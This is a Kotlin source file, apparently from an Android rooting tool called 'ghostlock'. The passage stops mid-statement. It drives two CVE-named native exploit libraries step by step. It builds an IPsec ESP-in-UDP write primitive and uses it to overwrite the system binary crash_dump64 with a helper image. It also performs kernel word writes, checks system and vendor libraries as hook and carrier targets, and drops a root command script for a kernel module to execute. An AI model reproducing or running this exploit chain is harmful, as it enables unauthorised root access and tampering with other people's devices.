package com.ghostlock.app.tempui

import com.ghostlock.app.core.generated.CredentialLayout43499
import com.ghostlock.app.core.generated.FinishVictim43499
import com.ghostlock.app.core.generated.HookPlanRequest43284
import com.ghostlock.app.core.generated.Init43284
import com.ghostlock.app.core.generated.ModuleCheck43284
import com.ghostlock.app.jni.cve43284.Assembled43284
import com.ghostlock.app.jni.cve43499.Assembled43499
import com.ghostlock.app.core.generated.Wait43284

import com.ghostlock.app.core.generated.Init43499
import com.ghostlock.app.core.generated.KernelLayout43499
import com.ghostlock.app.core.generated.Prepare43499
import com.ghostlock.app.core.generated.TargetOffsets43499
import com.ghostlock.app.core.generated.WordWrite43499
import com.ghostlock.app.jni.cve43284.Native43284
import com.ghostlock.app.jni.cve43499.Native43499
import com.ghostlock.app.log.GhostLog

/**
 * 新函数面的真机探针（D2 装配的门禁）。
 *
 * 它证明的是"**新库能被 Kotlin 调用**"这件事，逐项如下：
 *  1. 两个库各自加载成功（一个 backend 一个库）；
 *  2. create 给出正句柄；initialize 接受生成的 DTO（43499 四组）并按名回答；
 *  3. snapshot 回来的是**具名**数组（名字由 native 的 snapshotFields 导出，不手抄）；
 *  4. 没有设备 device hook 的调用一律**具名拒绝**（op-not-wired:<函数名>）；
 *  5. shutdown / destroy 走通，销毁后句柄作废（stale-handle）。
 *
 * 参数用哨兵值（占位）：真实 profile 仍在设计（本阶段目标到 J7 为止），所以这里只求"值能一路
 * 走到该到的地方"，不求它们是这一台机器的真值。
 */
object TypedBackendProbe {
    /** 探针日志的 logcat 标签。 */
    const val TAG = "GhostlockTyped"

    /** 跑两个 backend 的探针。@return 每一行（屏幕与 logcat 相同）。 */
    /** 探针拿到的 Context：建 SA（IpSecManager）要用它。 */
    @Volatile
    private var probeContext: android.content.Context? = null

    /**
     *  封装接收侧：**一直持有**（强引用）。
     *  关掉它、或让它被 GC 收走，内核就不再把 ESP-in-UDP 报文交给 xfrm —— 我们手搓的报文会无人认领。
     */
    @Volatile private var encapSocket: android.net.IpSecManager.UdpEncapsulationSocket? = null

    /** SA 建好后的材料：**只给写路径**用（门/拼装的材料不受影响）。 */
    @Volatile private var saSpi: Int = 0
    @Volatile private var saEncapPort: Int = 4500
    @Volatile private var saAesKey: ByteArray? = null
    @Volatile private var saHmacKey: ByteArray? = null
    /** 本次会话的 ESP 源端口：由一次真实 bind 取得（照上游：开 DatagramSocket → getLocalPort → close）。 */
    @Volatile private var saSenderPort: Int = 0

    /** 逐行回调：界面要在**过程中**看到每一行（跑完才返回的列表看不见进度）。 */
    @Volatile
    private var lineListener: ((String) -> Unit)? = null

    /** 单飞：同一条链不允许并发跑（启动自检与按钮同时跑会互撞 —— 2026-10-15 真机证据）。 */
    private val running = java.util.concurrent.atomic.AtomicBoolean(false)

    /**
     *  跑两个 backend 的探针，并把每一行**实时**交给 @p onLine。
     *
     *  @param context 应用上下文（建 SA 要用）。
     *  @param onLine 每产生一行就调用一次（在工作线程上）。
     *  @return 与 onLine 收到内容相同的完整列表。
     */
    fun run(context: android.content.Context, onLine: (String) -> Unit): List<String> {
        lineListener = onLine
        return try {
            run(context)
        } finally {
            lineListener = null
        }
    }

    fun run(context: android.content.Context): List<String> {
        if (!running.compareAndSet(false, true)) {
            val busy = listOf("typed: 攻击正在运行中（单飞守卫：同一条链不允许并发）")
            lineListener?.invoke(busy[0])
            return busy
        }
        try {
            return runOnce(context)
        } finally {
            running.set(false)
        }
    }

    /** 链子的本体（由 run 做单飞守卫后调用）。 */
    private fun runOnce(context: android.content.Context): List<String> {
        probeContext = context
        val lines = mutableListOf<String>()
        /* 第一件事：把模块要执行的收尾脚本放到它的固定路径上。 */
        fun step(line: String) {
            lines += line
            GhostLog.i(TAG, line)
            lineListener?.invoke(line)
        }
        /* first thing: the script the module runs must be in place (see deployUmhPayload). */
        deployUmhPayload(context) { line -> step(line) }
        /*
         *  43284 的唯一阻塞项的**关键一问**（纯 Kotlin，不需要 native）：
         *  公开 API 能不能**分配一个 SPI 并读回它**？能 ⇒ app 侧可自建 SA、帧材料自产；
         *  不能 ⇒ 只能走外部提供帧那条路。
         *
         *  判读：编译通过 = API 存在；真机跑出来 spi=… = 我们这条路成立（拿到数字）；
         *  抛具名异常 = 如实报告原因（例如需要权限）。
         */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            if (manager == null) {
                step("typed: ipsec spi skipped no-ipsec-service")
            } else {
                val address = java.net.InetAddress.getByName("127.0.0.1")
                val allocated = manager.allocateSecurityParameterIndex(address)
                step("typed: ipsec spi allocated=0x" + Integer.toHexString(allocated.spi))
                allocated.close()
                step("typed: ipsec spi closed")
            }
        }.onFailure { problem ->
            step("typed: ipsec spi refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /*
         *  第二问（与 SPI 同一族公开 API）：能不能开一个 UDP 封装套接字？
         *  注意：UdpEncapsulationSocket 不公开读端口的接口 ⇒ **端口由我们指定**（4500 = ESP-in-UDP 标准端口 ✓），
         *  开成功就等于拿到了 encap_port；被占用/被拒则给出具名原因。
         */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            if (manager == null) {
                step("typed: ipsec encap skipped no-ipsec-service")
            } else {
                val socket = manager.openUdpEncapsulationSocket(4500)
                step("typed: ipsec encap opened port=4500")
                socket.close()
                step("typed: ipsec encap closed")
            }
        }.onFailure { problem ->
            step("typed: ipsec encap refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 拼一帧会话材料并落盘（43284 的写路径要它）：SPI 用刚申请到的那个，encap 用 4500。 */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)
            val address = java.net.InetAddress.getByName("127.0.0.1")
            val allocated = manager!!.allocateSecurityParameterIndex(address)
            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(
                spi = allocated.spi,
                encapPort = 4500,
                senderPort = 0,
                aesKey = aesKey,
                hmacKey = hmacKey,
            )
            val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
                "/data/local/tmp/ghostlock-sa.frame",
                frame,
            )
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(frame)
                .joinToString("") { byte -> "%02x".format(byte) }
            step(
                "typed: sa frame written=" + written + " spi=0x" + Integer.toHexString(allocated.spi) +
                    " sha256=" + digest.take(16),
            )
            allocated.close()
        }.onFailure { problem ->
            step("typed: sa frame refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        /* 按上游序列建 SA（ExploitRunner.java:54-80）：开着 encap 套接字 → getPort → 申请 SPI → getSpi → */
        /* new IpSecAlgorithm(CRYPT_AES_CBC / AUTH_HMAC_SHA256) → setIpv4Encapsulation → build(loopback, spiObj)。 */
        /* transform 与 encap 套接字都保持打开（close 会拆 SA）。 */
        runCatching {
            val manager = context.getSystemService(android.net.IpSecManager::class.java)!!
            val encap = manager.openUdpEncapsulationSocket()
            val encapPort = encap.getPort()
            step("typed: ipsec sa encapPort=" + encapPort)
            /* 照上游 ExploitRunner.java:71-74：先开一个普通 UDP 套接字、取它的本地端口、立刻关掉，
             * 把这个**真实可用**的端口交给封装声明与我们自己的 ESP 套接字（写死端口会 bind 不上，
             * 源端口被内核随机挑 ⇒ 与封装声明不一致 ⇒ 报文被 ICMP 拒绝，即我们见到的 ECONNREFUSED）。 */
            val senderProbe = java.net.DatagramSocket()
            saSenderPort = senderProbe.localPort
            senderProbe.close()
            step("typed: ipsec sa senderPort=" + saSenderPort)
            val loopback = java.net.InetAddress.getByName("127.0.0.1")
            val spiObj = manager.allocateSecurityParameterIndex(loopback)
            val spi = spiObj.getSpi()
            step("typed: ipsec sa spi=0x" + Integer.toHexString(spi))
            val aesKey = ByteArray(32) { index -> (0xA0 + index).toByte() }
            val hmacKey = ByteArray(32) { index -> (0xB0 + index).toByte() }
            /* 先留副本：Android 的 IpSec/Crypto API 会擦掉它拿到的密钥数组（2026-10-15 真机实证：
             * 我们留在字段里的那份变成了全零 ⇒ sa-set-missing）。我们留非零副本，把原件交给 API。 */
            encapSocket = encap
            saSpi = spi
            saEncapPort = encapPort
            saAesKey = aesKey.copyOf()
            saHmacKey = hmacKey.copyOf()
            val transform = android.net.IpSecTransform.Builder(context)
                .setEncryption(
                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.CRYPT_AES_CBC, aesKey),
                )
                .setAuthentication(
                    android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128)  /* 128 bit = 16 字节，与帧的 icv_len 一致（96 会与 16 字节的 ICV 对不上） */,
                )
                .setIpv4Encapsulation(encap, saSenderPort)
                .buildTransportModeTransform(loopback, spiObj)
            step(
                "typed: ipsec sa built transform=" + (transform != null) +
                    " retainedAesNonZero=" + (saAesKey?.count { byte -> byte != 0.toByte() } ?: -1) +
                    " retainedHmacNonZero=" + (saHmacKey?.count { byte -> byte != 0.toByte() } ?: -1),
            )
            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(spi, encapPort, saSenderPort, aesKey, hmacKey)
            val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
                "/data/local/tmp/ghostlock-sa.frame",
                frame,
            )
            step("typed: ipsec sa frame=" + written + " (SA 已建、帧按同一材料落盘)")
        }.onFailure { problem ->
            step("typed: ipsec sa refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }

        probe43499(::step)
        probe43284(::step)
        return lines
    }

    private fun probe43499(step: (String) -> Unit) {
        if (!Native43499.ensureLoaded()) {
            step("typed: 43499 library missing (lib" + Native43499.LIBRARY + ".so)")
            return
        }
        step("typed: 43499 library loaded")
        val refusal = arrayOf("")
        val handle = Native43499.create()
        if (handle <= 0) {
            step("typed: 43499 create failed")
            return
        }
        step("typed: 43499 create ok")

        val names = Native43499.snapshotFields()
        val snapshot = LongArray(names.size)
        var code = Native43499.initialize(
            handle, init43499(), layout43499(), credential43499(), targets43499(), refusal,
        )
        step("typed: 43499 initialize code=" + code + " refusal=" + refusal[0])

        code = Native43499.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43499 snapshot code=" + code + " " +
                names.indices.joinToString(",") { names[it] + "=" + snapshot[it] },
        )

        val out = LongArray(names.size)
        code = Native43499.prepare(handle, prepare43499(), out, refusal)
        step("typed: 43499 prepare code=" + code + " refusal=" + refusal[0])

        code = Native43499.writeWord(handle, write43499(), refusal)
        step("typed: 43499 writeWord code=" + code + " refusal=" + refusal[0])

        code = Native43499.finishVictim(handle, FinishVictim43499(0, 0L), out, refusal)
        step("typed: 43499 finishVictim code=" + code + " refusal=" + refusal[0])

        code = Native43499.shutdown(handle, refusal)
        step("typed: 43499 shutdown code=" + code + " refusal=" + refusal[0])
        code = Native43499.destroy(handle, refusal)
        step("typed: 43499 destroy code=" + code + " refusal=" + refusal[0])
        code = Native43499.shutdown(handle, refusal)
        step("typed: 43499 shutdown-after-destroy code=" + code + " refusal=" + refusal[0])
    }

    private fun probe43284(step: (String) -> Unit) {
        if (!Native43284.ensureLoaded()) {
            step("typed: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
            return
        }
        step("typed: 43284 library loaded")
        val refusal = arrayOf("")
        val handle = Native43284.create()
        if (handle <= 0) {
            step("typed: 43284 create failed")
            return
        }
        step("typed: 43284 create ok")

        var code = Native43284.initialize(handle, init43284(), refusal)
        step("typed: 43284 initialize code=" + code + " refusal=" + refusal[0])

        val snapshot = LongArray(6)
        code = Native43284.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43284 snapshot code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        /* 本构建自带的两张图与钩子计划：数据性的那部分，D2 已经接线，所以这里必须是 ok。 */
        val image = Native43284.embeddedImage(handle, 0, refusal)
        step(
            "typed: 43284 embeddedImage code=" + (if (image == null) "null" else "ok") +
                " size=" + (image?.size ?: -1) + " refusal=" + refusal[0],
        )
        val hook = LongArray(4)
        val hookRequest = HookPlanRequest43284(
            ByteArray(16) { 0x11 }, "splice".toByteArray(), 0,
        )
        code = Native43284.hookPlan(handle, hookRequest, hook, refusal)
        step("typed: 43284 hookPlan code=" + code + " words=" + hook.joinToString(",") + " refusal=" + refusal[0])

        /* 模块校验：已经**接线**（纯计算）。用一段假字节 ⇒ 必须具名拒绝，不冒充成功。 */
        val moduleCheck = ModuleCheck43284(
            moduleImage = ByteArray(64) { 0x7F },
            kernelVermagic = "5.15.189-android13".toByteArray(),
        )
        code = Native43284.moduleCheck(handle, moduleCheck, refusal)
        step("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])

        /* 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。 */
        val terminal = LongArray(1)
        val wait = Wait43284(
            budgetMs = 40L,
            pollMs = 10L,
            successMarker = "ghostlock-ok".toByteArray(),
            failureMarker = "ghostlock-failed".toByteArray(),
            inFlightMarker = "ghostlock-running".toByteArray(),
            moduleMarker = "ghostlock".toByteArray(),
            moduleName = "/data/local/tmp/ghostlock-wait-probe".toByteArray(),
        )
        code = Native43284.waitTerminal(handle, wait, terminal, refusal)
        step(
            "typed: 43284 waitTerminal code=" + code + " state=" + terminal[0] +
                " refusal=" + refusal[0],
        )

        /* 门：真的以 O_RDWR 打开一个本应用可写的文件（用自身的缓存目录），再看一个不存在的路径。 */
        /*
         * 门的目标：优先用设备上那份**一次性载体**（16 KiB、world-writable，退役链当年就用它），
         * 因为 ESP 写需要「旧块内容」才能组出向量 —— 16 字节的小文件写到第二块就没有旧块了（NoOldBlock）。
         * 退路才是应用自己的缓存目录里的自建文件。
         */
        val sharedCarrier = java.io.File("/data/local/tmp/ghostlock-carrier")
        val doorPath = if (sharedCarrier.canRead() && sharedCarrier.canWrite() && sharedCarrier.length() >= 4096L) {
            sharedCarrier
        } else {
            java.io.File(System.getProperty("java.io.tmpdir") ?: "/data/local/tmp", "ghostlock-door-probe").apply {
                writeBytes(ByteArray(16) { 0x5A })
            }
        }
        val ticket = LongArray(1)
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 1, path = doorPath.absolutePath.toByteArray(), accessMode = 0,
            ),
            ticket,
            refusal,
        )
        step("typed: 43284 resolveTarget code=" + code + " ticket=" + ticket[0] + " refusal=" + refusal[0])

        /* 读回一块：走门那扇 fd 的 pread（设备工作）。文件里是刚写的十六个 0x5A。 */
        val block = ByteArray(16)
        code = Native43284.readBlock(
            handle,
            com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
            block,
            refusal,
        )
        step(
            "typed: 43284 readBlock code=" + code + " bytes=" +
                block.joinToString("") { byte -> "%02x".format(byte) } + " refusal=" + refusal[0],
        )

        /* patch1 via Kotlin：取本构建的 helper 镜像，按十六字节切块，逐块写进载体的开头。
           这一段的逻辑全在 Kotlin 侧（镜像来源、切块、偏移、顺序），native 只提供「取镜像」与「写一块」。 */
        var written = 0
        var refusedAt = -1
        val helper = Native43284.embeddedImage(handle, 0, refusal)
        if (helper == null) {
            step("typed: 43284 patch1-via-kotlin no-helper refusal=" + refusal[0])
        } else {
            var offset = 0L
            while (offset < helper.size) {
                val remaining = helper.size - offset.toInt()
                val width = if (remaining >= 16) 16 else remaining
                val chunk = helper.copyOfRange(offset.toInt(), offset.toInt() + width).copyOf(16)
                code = Native43284.writeBlock(
                    handle,
                    com.ghostlock.app.core.generated.WriteBlock43284(
                        ticket = ticket[0], offset = offset, block = chunk,
                    ),
                    refusal,
                )
                if (code != 0) {
                    refusedAt = offset.toInt()
                    break
                }
                written += 1
                offset += 16L
            }
            step("typed: 43284 patch1-via-kotlin blocks=" + written + " refusedAt=" + refusedAt)
            /* 回读第一块，看内容是不是真的落上了。 */
            val back = ByteArray(16)
            code = Native43284.readBlock(
                handle,
                com.ghostlock.app.core.generated.ReadBlock43284(ticket = ticket[0], offset = 0L),
                back,
                refusal,
            )
            code = Native43284.snapshot(handle, snapshot, refusal)
            step(
                "typed: 43284 patch1-readback code=" + code + " first16=" +
                    back.joinToString("") { byte -> "%02x".format(byte) } +
                    " writes=" + snapshot[4] + " flags=" + snapshot[1],
            )
        }

        /* 写一块：走落地对象（ESP 路线）。写成功只到 Dispatched；随后读回比较一致才会 Applied。 */
        code = Native43284.writeBlock(
            handle,
            com.ghostlock.app.core.generated.WriteBlock43284(
                ticket = ticket[0], offset = 0L, block = ByteArray(16) { 0x33 },
            ),
            refusal,
        )
        step("typed: 43284 writeBlock code=" + code + " refusal=" + refusal[0])
        code = Native43284.snapshot(handle, snapshot, refusal)
        step(
            "typed: 43284 snapshot-after-write code=" + code +
                " " + Native43284.snapshotFields().indices.joinToString(",") { index ->
                    Native43284.snapshotFields()[index] + "=" + snapshot[index]
                },
        )

        val badTicket = LongArray(1)
        code = Native43284.resolveTarget(
            handle,
            com.ghostlock.app.core.generated.ResolveTarget43284(
                role = 2, path = "/no/such/door".toByteArray(), accessMode = 0,
            ),
            badTicket,
            refusal,
        )
        step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
        code = Native43284.trigger(handle, com.ghostlock.app.core.generated.Trigger43284(150L), refusal)
        step("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])

        code = Native43284.shutdown(handle, refusal)
        step("typed: 43284 shutdown code=" + code + " refusal=" + refusal[0])
        code = Native43284.destroy(handle, refusal)
        step("typed: 43284 destroy code=" + code + " refusal=" + refusal[0])

        probeAssembled43284(step, doorPath.absolutePath)

        /* 43499 侧最小序列：建会话 → 按 route 取访问对象（1/2/3 都试，看工厂接受哪个）→ 收尾。 */
        val handle43499 = Native43499.create()
        if (handle43499 <= 0) {
            step("typed: assembled 43499 create failed")
        } else {
            val assembled43499 = Assembled43499(handle43499)
            for (route in 1..3) {
                val access43499 = assembled43499.openAccess(route)
                step(
                    "typed: assembled 43499 route=" + route + " access=" + access43499 +
                        " refusal=" + assembled43499.lastRefusal,
                )
            }
            /* 43499 的访问线最小序列：初始化 → 写一块 → 回读 → shutdown（每一步具名）。 */
            if (assembled43499.accessId != 0L) {
                val route = 1
                /* Assembly for initialize: seventeen values in the JNI export order, written here in Kotlin.
                 * They cover the twelve assembly_complete() insists on (buffer/task/lock offsets, attempts,
                 * arm hold and sequence, park, burst, max calls, nice modulus, fake task and fake lock). */
                assembled43499.assembly = longArrayOf(
                    96L, 48L, 56L, 264L, 4L, 20000L, 7L, 150L, 100L,
                    0L, 4L, 8L, 0L, 8L, 0L, 0x1000L, 0x2000L,
                )
                val inited = assembled43499.initializeAccess(route, 0L, true)
                step("typed: assembled 43499 init=" + inited + " refusal=" + assembled43499.lastRefusal)
                val probeBlock = ByteArray(16) { index -> (0x40 + index).toByte() }
                val wrote = assembled43499.writeBlock(route, 0L, 0L, probeBlock)
                step("typed: assembled 43499 write=" + wrote + " refusal=" + assembled43499.lastRefusal)
                val back = assembled43499.readBlock(route, 0L, 0L, 16)
                val same = back != null && back.contentEquals(probeBlock)
                step(
                    "typed: assembled 43499 read=" + (back?.size ?: -1) + " same=" + same +
                        " refusal=" + assembled43499.lastRefusal,
                )
                step("typed: assembled 43499 shutdown=" + assembled43499.shutdownAccess() + " refusal=" + assembled43499.lastRefusal)
            }
            step("typed: assembled 43499 close=" + assembled43499.close())
        }
    }

    /** 43284 的哨兵参数（顺序与字段名由 D1 单表定；真实 profile 仍待设计）。 */
    private fun init43284() = Init43284(
        spi = 0x1234,
        encapPort = 4500,
        /* 发送端口 0 = 让内核挑临时端口（真机实测：指定端口在应用进程里绑不上，临时端口可以）。 */
        senderPort = 0,
        icvLength = 16,
        aesKey = ByteArray(32) { 0xA5.toByte() },
        hmacKey = ByteArray(32) { 0x5A.toByte() },
        initialSequence = 1,
        sequencePresent = true,
    )

    /**
     *  写路径专用的会话材料：与内核里那条 SA 一致（ESP 报文才会被处理）。
     *
     *  @note 与 init43284() 分开：后者服务门/拼装/落地，改它会把门弄坏（2026-10-15 真机回归）。
     */
    /**
     *  写路径的会话材料（与 SA 一致）。
     *
     *  @param adoptSequence 大于 0 时作为 initialSequence 并提供 sequencePresent：
     *         同一 SA 上的后续会话必须**接着**前一个窗口的序号（防重放窗口由 SA 共享）。
     *  @return 可直接交给 native 的 Init43284。
     */
    private fun saInit(adoptSequence: Long = 0L): Init43284 {
        val aes = saAesKey
        val hmac = saHmacKey
        if (aes == null || hmac == null) {
            return init43284()
        }
        return Init43284(
            spi = saSpi,
            encapPort = saEncapPort,
            /* 上游用**具体** senderPort（setIpv4Encapsulation(encapSock, senderPort)），ESP-in-UDP 的入站
             * 分流按端口匹配；给 0 让内核挑临时端口时，报文可能因端口对不上被丢。 */
            senderPort = saSenderPort,
            icvLength = 16,
            /* 给 DTO 的是**副本**：native 读取器读完秘密字段会把它清零，若传同一数组会把我们留的字段也擦掉
             * （2026-10-15 真机实证：留存副本 32/32 非零，到写的时候却成了全零）。 */
            aesKey = aes.copyOf(),
            hmacKey = hmac.copyOf(),
            initialSequence = if (adoptSequence > 0L) adoptSequence.toInt() else 1,
            sequencePresent = adoptSequence > 0L,
        )
    }
    /**
     *  把 UMH 收尾脚本部署到模块固定的路径（A6-4：它是 DEVICE PAYLOAD，随 APK 以 assets/payload/root_cmd.sh 打包）。
     *
     *  模块（12304 B 那份）默认执行 /data/local/tmp/.ghostlock_lkm_cmd.sh（ghostlock.c: static char *cmd），
     *  未就位则模块加载后无人跑 ksud late-load —— 本会话卡住的正是这一步。
     *
     *  @param context 读 assets 用。
     *  @param onLine 逐行上报（失败具名，不静默）。
     */
    private fun deployUmhPayload(context: android.content.Context, onLine: (String) -> Unit) {
        runCatching {
            val target = java.io.File("/data/local/tmp/.ghostlock_lkm_cmd.sh")
            if (!target.exists()) {
                val bytes = context.assets.open("payload/root_cmd.sh").use { stream -> stream.readBytes() }
                target.writeBytes(bytes)
                target.setExecutable(true, false)
            }
            val size = if (target.exists()) target.length().toString() else "-"
            onLine("typed: umh payload path=" + target.absolutePath + " exists=" + (if (target.exists()) "1" else "0") + " bytes=" + size)
        }.onFailure { problem ->
            onLine("typed: umh payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
        }
    }

    private fun resolve43284() = com.ghostlock.app.core.generated.ResolveTarget43284(
        role = 1,
        path = "/system/lib64/libc++.so".toByteArray(),
        accessMode = 0,
    )

    /**
     * 用 Assembled43284 走一遍最小闭环（独立会话）：建 → 初始化 → 开门 → 读块 → 收尾。
     *
     * 这一段刻意只用**包装类**（拼装在 Kotlin），native 侧一行未改 —— 它验证的是包装类本身可用。
     */
    private fun probeAssembled43284(step: (String) -> Unit, doorPath: String) {
        if (!Native43284.ensureLoaded()) {
            step("typed: assembled 43284 library missing")
            return
        }
        val handle = Native43284.create()
        if (handle <= 0) {
            step("typed: assembled 43284 create failed")
            return
        }
        val session = Assembled43284(handle)
        session.initialize(init43284())
        step("typed: assembled 43284 init code=" + session.lastCode)
        val ticket = session.openTarget(doorPath, Assembled43284.ROLE_PATCH1)
        step("typed: assembled 43284 open code=" + session.lastCode + " ticket=" + ticket)
        val block = if (ticket != 0L) session.readBlock(ticket, 0L) else null
        step(
            "typed: assembled 43284 read bytes=" +
                (block?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + session.lastRefusal,
        )
        /* 分步拼装（拼装顺序写在 Kotlin 里）：开门 → socket → 拼接面 → 落地 → 拉起 → 收尾。 */
        val stepwiseHandle = Native43284.create()
        val stepwise = Assembled43284(stepwiseHandle) { saInit() }
        stepwise.initialize(init43284())
        val stepTarget = stepwise.openTargetStepwise(doorPath)
        step("typed: stepwise 43284 open target=" + stepTarget + " refusal=" + stepwise.lastRefusal)
        /* Single point check on a safe target: write a known pattern, then read it back at the same
         * offset and at its neighbours. That answers whether read and write share one address space. */
        runCatching {
            val pat = ByteArray(16) { index -> (0xA0 + index).toByte() }
            val wrote = stepwise.writeBlock(stepTarget, 0x1000L, pat)
            val hex = { b: ByteArray? -> b?.joinToString(" ") { x -> "%02x".format(x) } ?: "null" }
            step("typed: probe pattern wrote=" + wrote + " at=" + hex(stepwise.readBlock(stepTarget, 0x1000L)))
            step("typed: probe pattern below=" + hex(stepwise.readBlock(stepTarget, 0xFF0L)))
            step("typed: probe pattern above=" + hex(stepwise.readBlock(stepTarget, 0x1010L)))
        }.onFailure { problem -> step("typed: probe pattern refused " + problem.javaClass.simpleName) }
        val stepSocket = stepwise.openEspSocket()
        step("typed: stepwise 43284 socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
        val stepSurface = stepwise.buildSurface()
        step("typed: stepwise 43284 surface=" + stepSurface + " refusal=" + stepwise.lastRefusal)
        val stepLanding = stepwise.buildLanding()
        step("typed: stepwise 43284 landing=" + stepLanding + " refusal=" + stepwise.lastRefusal)
        /* 路 B：不单独 bringUp —— Access::initialize 自己会拉起（见计划 §11.32）。 */
        step("typed: stepwise 43284 bringUp=skipped-path-b")
        /* 经落地对象写 helper 镜像：这是「写目标在 Kotlin」的真机第一次尝试。 */
        val landed = stepwise.writeHelperThroughLanding()
        val back = stepwise.readLandingFirstBlock()
        step(
            "typed: stepwise 43284 landed=" + landed + " back=" +
                (back?.joinToString("") { byte -> "%02x".format(byte) } ?: "none") +
                " refusal=" + stepwise.lastRefusal,
        )
        /* 驱动器里 patch#1 的完整序列：建 Access → 初始化 → 写 helper 镜像（image=helper/offset=0/width=16）。 */
        val stepAccess = stepwise.buildAccess()
        step("typed: stepwise 43284 access=" + stepAccess + " refusal=" + stepwise.lastRefusal)

        /*
         *  只读取证（纯 Kotlin，不需要任何 native 改动）：在我们 app **自己的 uid** 下，
         *  这些目标能不能只读打开 —— 这是「从 app uid 起链」的第一批事实。
         *
         *  判读：exists 假 ⇒ 连看都看不到；exists 真而 canRead 假 ⇒ 被 SELinux 拒读，
         *  那一步就得换开发载体，或改由 LKM 阶段承担。
         */
        for (path in listOf(
            /* hook 目标候选（sentry 模式所在库） */
            "/system/lib64/libc++.so",
            "/system/lib64/libutils.so",
            "/system/lib64/libbinder.so",
            /* patch#1 的 helper */
            "/apex/com.android.runtime/bin/crash_dump64",
            /* 载体候选：dirtyfrag 选的那四个 vendor 库 + 我们的开发载体 */
            "/vendor/lib64/libbinderdebug.so",
            "/vendor/lib64/libstagefrighthw.so",
            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
            "/vendor/lib64/libbsp_module.so",
            "/data/local/tmp/ghostlock-carrier",
        )) {
            val file = java.io.File(path)
            val exists = file.exists()
            val canRead = file.canRead()
            val osAccess = runCatching { android.system.Os.access(path, android.system.OsConstants.R_OK) }
            val opened = runCatching {
                java.io.FileInputStream(file).use { stream -> stream.read() }
                "open=ok"
            }.getOrElse { problem -> "open=" + problem.javaClass.simpleName + ":" + (problem.message ?: "") }
            step(
                "typed: readable " + path + " exists=" + exists + " canRead=" + canRead +
                    " osAccess=" + osAccess.getOrElse { "throw" } + " " + opened +
                    " size=" + (if (exists) file.length() else -1L),
            )
        }
        val accessParams = Assembled43284.fullAccessParams(doorPath)
        val accessInit = stepwise.initializeAccessAndRemember(accessParams, saInit())
        step("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
        val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, saInit()) else false
        step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 accessDestroy=" + stepwise.destroyAccessNow())

        /*
         *  patch#1（helper 步骤）：为 crash_dump64 单开**第二个实例**（目标由 Kotlin 决定），
         *  用 embeddedImage(0) 的 helper 字节按 16 B 块写进去；writeImage 内部逐块回读比对，
         *  正好就是上游那条「写 + 校验」语义（短读=verify skipped，不符=VerifyMismatch）。
         *
         *  判读：wrote=true ⇒ 我们自己的字节真的写进了系统文件；否则看 refusal（具名）。
         */
        val patchTarget = "/apex/com.android.runtime/bin/crash_dump64"
        /* patch#1 的实例用**SA 的材料**（落地对象在 resolve 那一刻就把它焊死，写调用处换材料没用 —— 2026-10-15 读代码确认）。 */
        val patcher = Assembled43284(Native43284.create()) { saInit() }
        val patchDoor = patcher.openTargetStepwise(patchTarget)

        /* patch#1 必须走**自己的**分步链：此前它只建了 target，landing 一直是 0 ✗，
         * 于是 Access 落在**载体**的 landing 上 —— 读零、写错目标、verify 必败（2026-10-15 真机证据）。 */
        /* 一条 SA 只有一条 ESP 套接字（setIpv4Encapsulation 只声明一个 sender 端口）：复用第一条。 */
        patcher.reuseSocketFrom(stepwise)
        step("typed: patcher reuses socket=" + stepwise.socketId)
        val madeSurface = patcher.buildSurface()
        step("typed: patcher surfaceId=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        val madeLanding = patcher.buildLanding()
        step("typed: patcher landingId=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
        step("typed: marker-before-ids")
        step("typed: patch1 door=" + patchDoor + " refusal=" + patcher.lastRefusal)
        step("typed: patch1 access=" + patcher.buildAccess())
        val patchParams = Assembled43284.fullAccessParams(patchTarget)

        /* 两个会话的 id 对照：若 patch#1 的 access 挂在 stepwise 的 landing 上，就是这里串了。 */
        runCatching {
            step(
                "typed: ids stepwise target=" + stepwise.targetId + " landing=" + stepwise.landingId +
                    " access=" + stepwise.accessId + " || patcher target=" + patcher.targetId +
                    " landing=" + patcher.landingId + " access=" + patcher.accessId,
            )
        }.onFailure { problem ->
